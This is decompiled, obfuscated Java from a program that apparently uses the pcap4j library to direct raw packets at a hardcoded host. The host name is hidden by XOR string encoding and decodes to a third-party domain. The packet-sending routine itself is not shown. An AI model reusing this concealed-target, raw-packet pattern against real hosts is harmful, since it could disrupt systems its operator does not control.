import java.net.InetAddress;
import java.net.UnknownHostException;
import org.pcap4j.core.NotOpenException;
import org.pcap4j.core.PcapNativeException;

public class YN {
   private static final String a;
   private static final long b;

   public static void main(String[] var0) {
      new YN();
   }

   public YN() {
      int var1 = (int)b;
      String var2 = a;

      try {
         xq_2.A().p(InetAddress.getByName(var2), var1, null);
      } catch (PcapNativeException | NotOpenException | UnknownHostException var4) {
         var4.printStackTrace();
      }
   }

   // $VF: Irreducible bytecode was duplicated to produce valid code
   static {
      char[] var10003 = "H*5(;\r`E&".toCharArray();
      int var10004 = var10003.length;
      int var2 = 0;
      byte var13 = 26;
      char[] var10002 = var10003;
      int var4 = var10004;
      char[] var17;
      byte var21;
      int var10005;
      char var10006;
      byte var10007;
      if (var10004 <= 1) {
         var17 = var10003;
         var10005 = var2;
         char var10008 = var10003[var2];
         var10007 = 26;
         var10006 = var10008;
         switch (var2 % 7) {
            case 0:
               var21 = 48;
               break;
            case 1:
               var21 = 81;
               break;
            case 2:
               var21 = 70;
               break;
            case 3:
               var21 = 86;
               break;
            case 4:
               var21 = 84;
               break;
            case 5:
               var21 = 57;
               break;
            default:
               var21 = 25;
         }
      } else {
         var13 = 26;
         var4 = var10004;
         if (var10004 <= var2) {
            String var16 = new String(var10003).intern();
            byte var8 = -1;
            a = var16;
            long var3 = 5237909011323948486L;
            long var12 = -2941602860967129652L ^ var3;
            var8 = -1;
            b = var12;
            return;
         }

         var17 = var10003;
         var10005 = var2;
         char var22 = var10003[var2];
         var10007 = 26;
         var10006 = var22;
         switch (var2 % 7) {
            case 0:
               var21 = 48;
               break;
            case 1:
               var21 = 81;
               break;
            case 2:
               var21 = 70;
               break;
            case 3:
               var21 = 86;
               break;
            case 4:
               var21 = 84;
               break;
            case 5:
               var21 = 57;
               break;
            default:
               var21 = 25;
         }
      }

      while (true) {
         var17[var10005] = (char)(var10006 ^ var10007 ^ var21);
         var2++;
         if (var13 == 0) {
            var17 = var10002;
            var10005 = var13;
            char var24 = var10002[var13];
            var10007 = var13;
            var10006 = var24;
            switch (var2 % 7) {
               case 0:
                  var21 = 48;
                  break;
               case 1:
                  var21 = 81;
                  break;
               case 2:
                  var21 = 70;
                  break;
               case 3:
                  var21 = 86;
                  break;
               case 4:
                  var21 = 84;
                  break;
               case 5:
                  var21 = 57;
                  break;
               default:
                  var21 = 25;
            }
         } else {
            if (var4 <= var2) {
               String var15 = new String(var10002).intern();
               byte var6 = -1;
               a = var15;
               long var0 = 5237909011323948486L;
               long var11 = -2941602860967129652L ^ var0;
               var6 = -1;
               b = var11;
               return;
            }

            var17 = var10002;
            var10005 = var2;
            char var23 = var10002[var2];
            var10007 = var13;
            var10006 = var23;
            switch (var2 % 7) {
               case 0:
                  var21 = 48;
                  break;
               case 1:
                  var21 = 81;
                  break;
               case 2:
                  var21 = 70;
                  break;
               case 3:
                  var21 = 86;
                  break;
               case 4:
                  var21 = 84;
                  break;
               case 5:
                  var21 = 57;
                  break;
               default:
                  var21 = 25;
            }
         }
      }
   }
}





